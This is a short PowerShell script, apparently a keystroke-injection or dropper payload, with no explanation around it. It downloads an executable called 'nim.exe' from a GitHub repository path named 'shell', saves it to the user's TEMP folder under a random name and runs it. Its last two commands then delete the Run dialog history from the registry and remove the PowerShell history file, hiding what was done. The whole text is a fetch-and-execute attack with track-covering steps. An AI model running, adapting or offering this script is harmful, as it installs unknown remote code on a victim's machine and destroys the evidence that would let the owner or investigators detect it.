iwr https://github.com/VBV11/shell/raw/main/nim.exe?dl=1 -O $env:TEMP\ASA4oweLqG1cf2859e-7ea8-4f08-afe6-27870ab67338.exe

cd AppData\Local\Temp 

.\ASA4oweLqG1cf2859e-7ea8-4f08-afe6-27870ab67338.exe

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath
